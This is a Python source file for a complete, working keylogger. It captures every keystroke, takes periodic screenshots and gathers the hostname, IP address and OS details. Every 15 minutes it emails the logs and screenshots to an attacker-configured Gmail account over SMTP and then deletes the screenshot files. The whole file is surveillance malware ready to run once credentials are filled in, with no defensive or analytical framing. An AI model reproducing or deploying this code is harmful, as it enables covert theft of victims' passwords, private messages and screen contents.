import keyboard  # for keylogs
import socket
import os
import platform
import smtplib  # for sending email using SMTP protocol (gmail)
from email.mime.text import MIMEText #for attaching images in the mail
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
# Semaphore is for blocking the current thread # Timer is to make a method runs after an `interval` amount of time
from threading import Semaphore, Timer
import pyscreenshot as ImageGrab #for screenshot

SEND_REPORT_EVERY = 900  # 15 minutes
EMAIL_ADDRESS = "" #Enter Email
EMAIL_PASSWORD = "" # Enter Password

class Keylogger:
    def __init__(self, interval):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        # for blocking after setting the on_release listener
        self.semaphore = Semaphore(0)

    def callback(self, event):
        # This callback is invoked whenever a keyboard event(Key Press) is occured
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
        # Write the key logs to a file
        # Comment next two lines if you don't want to log in a file and want just a email to be sent.
        with open("output.txt", "w+") as output:
            output.write(self.log)

    @staticmethod
    def sendmail(email, password, message):
        # manages a connection to an SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to the SMTP server as TLS mode
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message
        server.sendmail(email, email, message)
        # terminates the session
        server.quit()
    
    @staticmethod
    def SendImage(ImgFileName):
        #this method sends screenshot as an attachment 
        img_data = open(ImgFileName, 'rb').read()
        msg = MIMEMultipart()
        msg['Subject'] = 'Screenshot'
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS

        text = MIMEText("test")
        msg.attach(text)
        image = MIMEImage(img_data, name=os.path.basename(ImgFileName))
        msg.attach(image)

        s = smtplib.SMTP(host="smtp.gmail.com", port=587)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        s.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg.as_string())
        s.quit()

    def screenshot(self):
        #screen is taken using pyscreenshot module 
        im = ImageGrab.grab()
        #this command gets us the current folder the program is placed in 
        cwd = os.getcwd()
        path = cwd + "/" + "screenshot.png"
        im.save(path)
        self.SendImage(path)
        #the screenshot file is deleted after sending the mail
        os.remove(path)

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        #along with the log files the screenshot is also sent every self.iterval time
        self.screenshot()

        if self.log:
            # if there is something in log, report it
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            # print to the Terminal
            # print(self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def computer_info(self):
        #this method mails the basic information about the system in the beginning
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        mssg = "Information of the system\n"

        mssg += "Architecture - " + platform.architecture()[0] + " " + platform.architecture()[1] 
        mssg += "\nMachine - " + platform.machine()
        mssg += "\nSystem - " + platform.system() + "\n" + platform.version() + "\n"
        mssg += "Hostname - " + hostname + "\n"
        mssg += "IP Address - " + IPAddr + "\n"

        # Write the information to a file
        # Comment next two lines if you don't want to log in a file and want just a email to be sent.
        with open("output2.txt", "w+") as output2:
            output2.write(mssg)

        self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, mssg)


    def start(self):
        
	# start the keylogger
        keyboard.on_release(callback=self.callback)
	

	# send the information of the system     
        self.computer_info()
 	
	# start reporting the keylogs
        self.report()
        
        # block the current thread,
        # since on_release() doesn't block the current thread
        # if we don't block it, when we execute the program, nothing will happen
        # that is because on_release() will start the listener in a separate thread
        self.semaphore.acquire()


if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()